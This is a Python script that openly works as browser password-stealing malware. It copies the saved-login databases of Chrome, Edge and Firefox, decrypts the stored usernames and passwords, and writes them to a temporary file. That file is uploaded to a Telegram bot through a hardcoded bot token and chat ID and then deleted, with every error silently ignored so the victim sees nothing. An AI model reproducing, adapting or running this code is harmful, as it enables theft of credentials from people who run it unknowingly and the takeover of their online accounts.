import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import requests
import getpass
import glob
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Telegram config
TELEGRAM_BOT_TOKEN = "7733366488:AAHFBq_N1Ix-DFnzbw7nIrc_TDxZYo_hJME"
TELEGRAM_CHAT_ID = "6023417944"

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_chrome_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        return ""

def get_firefox_master_key(profile_path):
    try:
        key_db = os.path.join(profile_path, "key4.db")
        if not os.path.exists(key_db):
            key_db = os.path.join(profile_path, "key3.db")
        conn = sqlite3.connect(key_db)
        cursor = conn.cursor()
        cursor.execute("SELECT item1, item2 FROM nssPrivate WHERE a11 = 'password-check'")
        for row in cursor.fetchall():
            encrypted_key = row[1]
            if encrypted_key:
                return encrypted_key
        return None
    except:
        return None

def decrypt_firefox_password(encrypted_password, master_key):
    try:
        if not master_key:
            return ""
        iv = encrypted_password[16:24]
        ciphertext = encrypted_password[24:]
        cipher = Cipher(algorithms.TripleDES(master_key[:24]), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        return decrypted.decode("utf-8", errors="ignore").strip()
    except:
        return ""

def send_to_telegram(file_path):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": TELEGRAM_CHAT_ID}
            requests.post(url, data=data, files=files, timeout=5)
    except:
        pass

def steal_browser_passwords():
    output = []
    username = getpass.getuser()
    temp_dir = "C:\\Temp"
    output_file = os.path.join(temp_dir, f"{username}_Browser_Passwords.txt")
    os.makedirs(temp_dir, exist_ok=True)

    # Chrome
    chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    if os.path.exists(chrome_path):
        key = get_encryption_key(chrome_path)
        if key:
            db_path = os.path.join(chrome_path, "Default", "Login Data")
            temp_db = os.path.join(temp_dir, "ChromeData.db")
            try:
                shutil.copyfile(db_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
                for row in cursor.fetchall():
                    origin_url, action_url, username, password, date_created, date_last_used = row
                    if username or password:
                        password = decrypt_chrome_password(password, key)
                        entry = f"Browser: Chrome\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\n"
                        if date_created != 86400000000 and date_created:
                            entry += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
                        if date_last_used != 86400000000 and date_last_used:
                            entry += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
                        entry += "="*50 + "\n"
                        output.append(entry)
                cursor.close()
                conn.close()
                os.remove(temp_db)
            except:
                pass

    # Edge
    edge_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")
    if os.path.exists(edge_path):
        key = get_encryption_key(edge_path)
        if key:
            db_path = os.path.join(edge_path, "Default", "Login Data")
            temp_db = os.path.join(temp_dir, "EdgeData.db")
            try:
                shutil.copyfile(db_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
                for row in cursor.fetchall():
                    origin_url, action_url, username, password, date_created, date_last_used = row
                    if username or password:
                        password = decrypt_chrome_password(password, key)
                        entry = f"Browser: Edge\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\n"
                        if date_created != 86400000000 and date_created:
                            entry += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
                        if date_last_used != 86400000000 and date_last_used:
                            entry += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
                        entry += "="*50 + "\n"
                        output.append(entry)
                cursor.close()
                conn.close()
                os.remove(temp_db)
            except:
                pass

    # Firefox
    firefox_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    if os.path.exists(firefox_path):
        profiles = glob.glob(os.path.join(firefox_path, "*.default-release")) or glob.glob(os.path.join(firefox_path, "*.default"))
        for profile in profiles:
            logins_path = os.path.join(profile, "logins.json")
            if os.path.exists(logins_path):
                master_key = get_firefox_master_key(profile)
                if master_key:
                    try:
                        with open(logins_path, "r", encoding="utf-8") as f:
                            logins = json.load(f)
                        for login in logins.get("logins", []):
                            username = login.get("encryptedUsername", "")
                            password = login.get("encryptedPassword", "")
                            origin_url = login.get("hostname", "")
                            date_created = login.get("timeCreated", 0)
                            date_last_used = login.get("timeLastUsed", 0)
                            if username or password:
                                username = decrypt_firefox_password(base64.b64decode(username), master_key)
                                password = decrypt_firefox_password(base64.b64decode(password), master_key)
                                entry = f"Browser: Firefox\nOrigin URL: {origin_url}\nUsername: {username}\nPassword: {password}\n"
                                if date_created:
                                    entry += f"Creation date: {datetime.fromtimestamp(date_created/1000).strftime('%Y-%m-%d %H:%M:%S')}\n"
                                if date_last_used:
                                    entry += f"Last Used: {datetime.fromtimestamp(date_last_used/1000).strftime('%Y-%m-%d %H:%M:%S')}\n"
                                entry += "="*50 + "\n"
                                output.append(entry)
                    except:
                        pass

    # Write and send output
    if output:
        try:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("".join(output))
            send_to_telegram(output_file)
        except:
            pass
        finally:
            try:
                os.remove(output_file)
            except:
                pass

def main():
    try:
        steal_browser_passwords()
    except:
        pass

if __name__ == "__main__":
    main()
